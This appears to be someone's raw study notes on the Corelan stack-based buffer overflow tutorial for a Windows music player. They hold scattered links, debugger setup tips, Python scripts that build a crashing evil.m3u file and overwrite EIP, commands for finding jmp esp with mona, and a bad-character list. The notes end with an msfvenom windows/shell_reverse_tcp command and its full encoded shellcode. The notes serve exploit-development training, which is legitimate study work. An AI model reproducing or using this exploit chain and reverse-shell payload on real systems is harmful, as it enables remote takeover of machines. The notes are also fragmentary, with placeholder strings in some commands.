https://github.com/int0x33/nc.exe/

https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

https://rayanfam.com/topics/pykd-tutorial-part1/

https://githomelab.ru/pykd/pykd

https://pypi.org/project/pykd/#files

https://githomelab.ru/pykd

https://hshrzd.wordpress.com/2022/01/06/python-scripting-for-windbg-a-quick-introduction-to-pykd/

https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/

http://www.windbg.org/


```
padding = "\x41" * 26088
eip = "\x42" * 4
inbetween_eip_esp = "\x44" * 4
exploit = "\x43" * 100

payload = padding + eip + inbetween_eip_esp + exploit

f = open("evil.m3u", "w")
f.write(payload)
f.close
```

import sys
sys.path

add python to path in windows C:\Python27

add C:\Python27\Scripts to path as thats where pip is or just python -m pip install pykd

C:\Python27\Lib\site-packages\pykd

https://blog.csdn.net/xiaohua_de/article/details/78058089

https://blog.actorsfit.com/a?ID=00550-ff5bf95a-70c1-478f-ad89-fea0ba6462a6

https://iphelix.medium.com/ida-sploiter-9604e0b8829

https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

































# Corelan Exploit writing tutorial part 1 : Stack Based Overflows

### Step -1: Theory

- PC (Instructor Pointer): Point to next instruction

- ESP: Point to TOP of stack

- EBP: Point to BOTTOM of stack

- Code/Text Segment: Store actual code. Often read-only as seen from [wikipedia](https://en.wikipedia.org/wiki/Code_segment)

- Data Segment: Store variables. Usually writeable

- Stack Segment: Store function datas/arguments

- More [here](https://github.com/jivoi/pentest/blob/master/notes/info/buffer-overflows.txt)

### Step 0: Set Up

- [http://www.oldversion.com/](http://www.oldversion.com/)

- [https://www.exploit-db.com/exploits/10619](https://www.exploit-db.com/exploits/10619)

- Install Python2, Ida freeware, WinDBG (from [Windows SDK](https://developer.microsoft.com/en-gb/windows/downloads/windows-sdk/))

    - Learn to manually add exploit frameworks such as Mona

- Use VMs and allow communication between them via [bridged adapters](https://superuser.com/questions/710451/cant-ping-between-two-guest-os-in-virtualbox)

### Step 1: Fuzzing/Verifying the Crash

- Python Script (any program should suffice). Make sure padding more than 27000

    ```
    payload = '\x41' * 30000
    with open("evil.m3u", "wb") as f:
        f.write(payload)
    f.close()
    ```

- Open the file with music player (should crash)

### Step 2: Controlling EIP

- Use msf-pattern_create & msf-pattern_offset

- Cheat and know that the offset is 26094

- Python Script (any program should suffice)

    ```
    padding = "\x41" * 26088
    eip = "\x42" * 4
    inbetween_eip_esp = "\x44" * 4
    exploit = '\x43' * 1000
    payload = padding + eip + inbetween_eip_esp + exploit
    f = open("evil.m3u", "w")
    f.write(payload)
    f.close
    ```










https://github.com/corelan/windbglib

https://distributedcompute.com/2019/04/05/using-mona-with-windbg/

https://stackoverflow.com/questions/43688302/windbg-cant-find-python-interpreter-for-pykd

https://github.com/corelan/windbglib/issues/11

https://github.com/corelan/windbglib/issues/18

make sure use x86 version of windbg



finding jmp esp opcode:
findjmp (from Ryan Permeh) : compile findjmp.c and run with the following parameters :
findjmp .  Suppose you want to look for jumps to esp in kernel32.dll, run  “findjmp kernel32.dll esp”

On Vista SP2, you should get something like this :

Findjmp, Eeye, I2S-LaB

Findjmp2, Hat-Squad

Scanning kernel32.dll for code useable with the esp register

0x773AF74B      call esp

Finished Scanning kernel32.dll for code useable with the esp register

Found 1 usable addresses

finding opcodes

findjmp (from Ryan Permeh) : compile findjmp.c and run with the following parameters :
findjmp .  Suppose you want to look for jumps to esp in kernel32.dll, run  “findjmp kernel32.dll esp”
the metasploit opcode database
memdump (see one of the next tutorial posts
pvefindaddr, a plugin for Immunity Debugger. In fact, this one is highly recommended because it will automatically filter unreliable pointers.

nasm shell





https://github.com/Byzero512/winpwn

https://stackoverflow.com/questions/61259719/windbg-dump-path-of-loaded-dll-which-only-shows-dll-name

lmf

debug -> modules

0x03a8f23a

s asdasd l asdasd jmp esp

WINDBG

```
a (for assemble)
jmp esp
GET THE ADDRESS (but this way most likely won' reliably work due to aslr and other memory protection schemes unless u find one in which memory protection schemes are disabled)
RETURN to exit

u GET THE ADDRESS (to verify that indeed the address points to jmp esp instruction)
```



https://www.youtube.com/watch?v=MJz2GDL5B3o

!py mona modules

!mona modules

!py mona find 

push esp/jmp esp should be fine

!mona modules

!mona find

!mona jmp -r esp -m asdasdads.dll

!mona find -s "\xff\xe4" -m asdasdads.dll

https://security.stackexchange.com/questions/239019/vulnserver-cant-find-jmp-esp-in-ntdll-dll

https://oscp.securable.nl/buffer-overflow

0x00     NULL (\0)
0x09     Tab (\t)
0x0a     Line Feed (\n)
0x0d     Carriage Return (\r)
0xff     Form Feed (\f)

https://security.stackexchange.com/questions/241160/what-is-source-of-bad-characters-exist-in-buffer-overflows

https://www.youtube.com/watch?v=MJz2GDL5B3o

https://failingsilently.wordpress.com/2017/08/05/msfvenom-encoders-and-formats/



msfvenom -p windows/shell_reverse_tcp LHOST=192.168.18.2 LPORT=135 -b "\x00\x09\x0A" -f python -v payload -e x86/shikata_ga_nai

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.18.14 LPORT=135 -b "\x00\x09\x0A" -f python -v payload -e x86/shikata_ga_nai
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xba\xfb\xd0\x1e\x15\xda\xc9\xd9\x74\x24\xf4\x5e"
payload += b"\x33\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e\x03\xad"
payload += b"\xde\xfc\xe0\xad\x37\x82\x0b\x4d\xc8\xe3\x82\xa8"
payload += b"\xf9\x23\xf0\xb9\xaa\x93\x72\xef\x46\x5f\xd6\x1b"
payload += b"\xdc\x2d\xff\x2c\x55\x9b\xd9\x03\x66\xb0\x1a\x02"
payload += b"\xe4\xcb\x4e\xe4\xd5\x03\x83\xe5\x12\x79\x6e\xb7"
payload += b"\xcb\xf5\xdd\x27\x7f\x43\xde\xcc\x33\x45\x66\x31"
payload += b"\x83\x64\x47\xe4\x9f\x3e\x47\x07\x73\x4b\xce\x1f"
payload += b"\x90\x76\x98\x94\x62\x0c\x1b\x7c\xbb\xed\xb0\x41"
payload += b"\x73\x1c\xc8\x86\xb4\xff\xbf\xfe\xc6\x82\xc7\xc5"
payload += b"\xb5\x58\x4d\xdd\x1e\x2a\xf5\x39\x9e\xff\x60\xca"
payload += b"\xac\xb4\xe7\x94\xb0\x4b\x2b\xaf\xcd\xc0\xca\x7f"
payload += b"\x44\x92\xe8\x5b\x0c\x40\x90\xfa\xe8\x27\xad\x1c"
payload += b"\x53\x97\x0b\x57\x7e\xcc\x21\x3a\x17\x21\x08\xc4"
payload += b"\xe7\x2d\x1b\xb7\xd5\xf2\xb7\x5f\x56\x7a\x1e\x98"
payload += b"\x99\x51\xe6\x36\x64\x5a\x17\x1f\xa3\x0e\x47\x37"
payload += b"\x02\x2f\x0c\xc7\xab\xfa\x83\x97\x03\x55\x64\x47"
payload += b"\xe4\x05\x0c\x8d\xeb\x7a\x2c\xae\x21\x13\xc7\x55"
payload += b"\xa2\xdc\xb0\x47\x3c\xb5\xc2\x67\x40\xc2\x4a\x81"
payload += b"\x2a\xdc\x1a\x1a\xc3\x45\x07\xd0\x72\x89\x9d\x9d"
payload += b"\xb5\x01\x12\x62\x7b\xe2\x5f\x70\xec\x02\x2a\x2a"
payload += b"\xbb\x1d\x80\x42\x27\x8f\x4f\x92\x2e\xac\xc7\xc5"
payload += b"\x67\x02\x1e\x83\x95\x3d\x88\xb1\x67\xdb\xf3\x71"
payload += b"\xbc\x18\xfd\x78\x31\x24\xd9\x6a\x8f\xa5\x65\xde"
payload += b"\x5f\xf0\x33\x88\x19\xaa\xf5\x62\xf0\x01\x5c\xe2"
payload += b"\x85\x69\x5f\x74\x8a\xa7\x29\x98\x3b\x1e\x6c\xa7"
payload += b"\xf4\xf6\x78\xd0\xe8\x66\x86\x0b\xa9\x97\xcd\x11"
payload += b"\x98\x3f\x88\xc0\x98\x5d\x2b\x3f\xde\x5b\xa8\xb5"
payload += b"\x9f\x9f\xb0\xbc\x9a\xe4\x76\x2d\xd7\x75\x13\x51"
payload += b"\x44\x75\x36"

